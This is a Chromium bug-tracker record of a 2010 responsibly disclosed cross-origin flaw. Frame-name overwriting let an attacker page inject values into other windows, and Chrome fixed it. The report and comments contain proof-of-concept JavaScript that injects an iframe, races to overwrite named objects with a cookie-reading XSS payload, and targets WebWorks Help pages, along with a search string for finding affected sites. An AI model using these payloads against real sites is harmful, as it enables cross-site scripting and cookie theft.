# Chrome cross window & cross domain object access

| Field | Value |
|-------|-------|
| **Issue ID** | [40083166](https://issues.chromium.org/issues/40083166) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | st...@gmail.com |
| **Assignee** | ab...@chromium.org |
| **Created** | 2010-09-13 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

It is possible to let windows access other windows objects even though they are cross domain.  

This can be done in spite of the SOP by creating, from an attacker's page, an IFRAME with the name of the object the other window is trying to access and the overwriting it using JavaScript. It works on every window reference.

If it is possible I'd like to be posted about the time line for the fix, and have credits as the discoverer of this issue as Stefano Di Paola of MindedSecurity.

**VERSION**  

Chrome Version: Chrome (6.0.472.55)  

Operating System: Linux ubuntu and Windows Xp

**REPRODUCTION CASE**  

Victim host has a page like the following:

<script>
document.writeln("<p>" +
window.opener.WWHFrame.WWHHelp.mMessages.mBookmarkLinkMessage + "</p>");
document.writeln("<p>" +
window.opener.WWHFrame.WWHControls.fBookmarkLink() + "</p>");
</script>

Obviously it won't be directly exploitable as a DOMXss since the attacker  

cannot control WWHFrame object because of SOP.

But Attacker can use this evil page to trigger the Xss:

document.body.innerHTML+="<iframe name=WWHFrame src='/'></iframe>"; // create the iframe with the name we want.

function go(){ // overwrite the name with an object  

WWHFrame={WWHHelp: {  

mMessages:{mBookmarkLinkMessage:"<scr"+"ipt>alert(document.cookie)</scr"+"ipt>"}  

} , WWHControls:{fBookmarkLink:function(){return "";}}}  

}

si=setInterval(go,1); //Race Condition for setting the value at the right time..

open('[http://vi.ct.im/page.html',"\_blank](http://vi.ct.im/page.html',%22_blank)");

After that the victim site will have access to the object itself and in  

some case will use those values in the page itself like writing or  

evaluating them in the document, triggering a Browser based DOM Xss.  

Of course that is a simple example using opener, but it works for any  

window reference.

## Timeline

### sc...@gmail.com (2010-09-13)

Thanks for entering the report here, Stefano! We will be happy to credit you as directed.
All discussion in terms of timelines, proposed solutions, severity, etc. occur in the bug so feel free to join in :)

Do you happen to have any examples of sites which are negatively impacted by this?

cc: abarth@ since he is an expert in cross-origin reference leaks :)

### ab...@chromium.org (2010-09-13)

Crazy.  There are more dangerous attack scenarios than the one outlined above.  We should get a repro set up to play with.

### st...@gmail.com (2010-09-13)

Thanks Chris,

sites affected: google for inurl:wwhimpl/common/html/document.htm

The Web Works Help is affected by this kind of attacks.

document.body.innerHTML+="<iframe name=WWHHelp   src='/' test='a'></iframe>"

function go(){
 
 WWHHelp=
 {fDisplayContextDocument:function(){return "<scr"+"ipt>alert(document.cookie)</scr"+"ipt>"}
   }  
}
si=setInterval(go,1);
 document.getElementById("d").contentWindow.location('http://host/with/wwhimpl/common/html/document.htm' );
//http://livedocs.adobe.com/flex/201/html/wwhelp/wwhimpl/common/html/document.htm

Also tinymce and fckeditor are probably affected as well (they were for opener IE7 issue).

It works for any window reference top|parent|opener etc




### st...@gmail.com (2010-09-13)

Of course yes, data leakage is another problem :)


### st...@gmail.com (2010-09-13)

Sorry for multiple posts, but my mind works in mysterious ways.

Just a thought, but maybe the could be the possibility of classic access to unreferenced objects or other memory issues.
I'm not really in webkit/chromium internals so I did not (and I won't) go further.


### st...@gmail.com (2010-09-13)

Also works for other "native" objects:
//From attacker
document.body.innerHTML+="<iframe name=document   src='/' test='a'></iframe> "
document.test="s"

//from victim
top.document.test
returns "s"



### ab...@chromium.org (2010-09-13)

It sounds like the entries for frame names aren't being shielded by the origin access check in the global object.  I haven't tried to repro yet.

### st...@gmail.com (2010-09-13)

@abarth, AFAIK it's like that for every browser (no security exception triggered) even when SOP is not satisfied.
It just returns the window object.

To my opinion the SOP breaking works like the following:
1. DOM access is granted for iframe js object (returns DOMWindow) (this is correct).
2. when the object or its attributes are created/overwritten from the attacker page SOP access control is lost because it is no more considered a Window (this is not correct).

I could be wrong, of course.

### in...@chromium.org (2010-09-13)

Filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=45700 with repro.

Adam, can you please take a look.

### in...@chromium.org (2010-09-14)

Fixed in r67509: <http://trac.webkit.org/changeset/67509>. Needs to merged to 472 and 517 branches.

Thanks Stefano for this nice bug.

### st...@gmail.com (2010-09-15)

Thank you guys,
you're super fast!
Any idea when you'll release the fix? 
Just to know when I can publish my findings.

### sc...@gmail.com (2010-09-15)

Merged to 472: http://src.chromium.org/viewvc/chrome?view=rev&revision=59539

Stefano, it may even get released this week. That would probably break some form of record. Certainly next week. Keep an eye on http://googlechromereleases.blogspot.com/

### sc...@gmail.com (2010-09-16)

@Stefano: congrats! This report provisionally qualifies for a $1000 Chromium Security Reward! Aside from being serious in the context of many sites, the panel found this bug to exhibit a nice clever twist :)

### st...@gmail.com (2010-09-16)

Thanks Chris 
...and thanks to the panel for being so kind! :)

I'll look for news on Chrome releases blog.


### in...@chromium.org (2010-09-17)

Merged to 517.

### sc...@gmail.com (2010-09-17)

Fix live with 6.0.472.62: http://googlechromereleases.blogspot.com/2010/09/stable-beta-channel-updates_17.html

Thanks Stefano. If you could wait a couple of days before dropping the full details that would be awesome.

### sc...@gmail.com (2010-10-06)

Payment is in the electronic system.

### sc...@gmail.com (2010-11-03)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/55350?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083166)*
